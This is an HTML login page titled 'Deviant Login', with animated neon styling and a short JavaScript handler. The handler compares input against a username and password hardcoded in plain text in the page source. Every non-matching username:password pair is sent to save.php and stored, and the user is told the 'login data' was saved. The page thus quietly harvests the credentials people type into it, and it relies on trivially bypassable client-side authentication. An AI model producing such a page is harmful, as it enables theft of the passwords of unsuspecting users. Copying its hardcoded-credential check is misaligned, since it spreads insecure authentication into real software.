<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deviant Login</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(circle at center, #01010d, #001a33);
            font-family: 'Arial', sans-serif;
            overflow: hidden;
            position: relative;
        }

        .container {
            text-align: center;
            position: relative;
        }

        .login-box {
            background: rgba(0, 0, 0, 0.8);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.7);
            position: relative;
            z-index: 10;
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            color: #00ffff;
            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            outline: none;
            background: rgba(255, 255, 255, 0.1);
            color: #00ffff;
            font-size: 1rem;
            text-shadow: 0 0 5px #00ffff;
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
        }

        .input-group input::placeholder {
            color: #80d4ff;
        }

        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            background: linear-gradient(90deg, #00224f, #00ffff);
            color: #fff;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.5s ease, transform 0.2s ease;
            text-shadow: 0 0 10px #00ffff;
        }

        button:hover {
            background: linear-gradient(90deg, #00ffff, #00224f);
            transform: scale(1.05);
            box-shadow: 0 0 20px #00ffff;
        }

        .background-effects {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            overflow: hidden;
        }

        .circle {
            position: absolute;
            border-radius: 50%;
            background: rgba(0, 255, 255, 0.2);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5), 0 0 30px rgba(0, 255, 255, 0.3);
            animation: pulse 6s infinite ease-in-out;
        }

        .circle:nth-child(1) {
            width: 400px;
            height: 400px;
            top: 20%;
            left: 10%;
        }

        .circle:nth-child(2) {
            width: 500px;
            height: 500px;
            bottom: 15%;
            right: 15%;
        }

        .circle:nth-child(3) {
            width: 300px;
            height: 300px;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
                opacity: 0.8;
            }
            50% {
                transform: scale(1.2);
                opacity: 0.4;
            }
        }

        .jarvis-animation {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 300px;
            border: 3px solid rgba(0, 255, 255, 0.3);
            border-radius: 50%;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
            animation: spin 8s linear infinite;
        }

        .jarvis-animation::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 250px;
            height: 250px;
            border-radius: 50%;
            background: rgba(0, 255, 255, 0.1);
            transform: translate(-50%, -50%);
            animation: pulseJarvis 6s infinite;
        }

        .jarvis-animation::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 200px;
            height: 200px;
            border-radius: 50%;
            background: rgba(0, 255, 255, 0.2);
            transform: translate(-50%, -50%);
            animation: pulseJarvis 4s infinite reverse;
        }

        @keyframes spin {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }

        @keyframes pulseJarvis {
            0%, 100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }
            50% {
                transform: translate(-50%, -50%) scale(1.5);
                opacity: 0.5;
            }
        }
    </style>
</head>
<body>
    <div class="background-effects">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="jarvis-animation"></div>
    </div>
    <div class="container">
        <div class="login-box">
            <h1>Deviant Login</h1>
            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Username" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit">Login</button>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username === "Deviant" && password === "3591eru3591") {
                window.location.href = "chat.html";
            } else {
                const data = `${username}:${password}\n`;

                fetch('save.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `data=${encodeURIComponent(data)}`,
                })
                .then(response => {
                    if (response.ok) {
                        alert('Login data saved successfully!');
                    } else {
                        alert('Failed to save login data.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            }
        });
    </script>
</body>
</html>
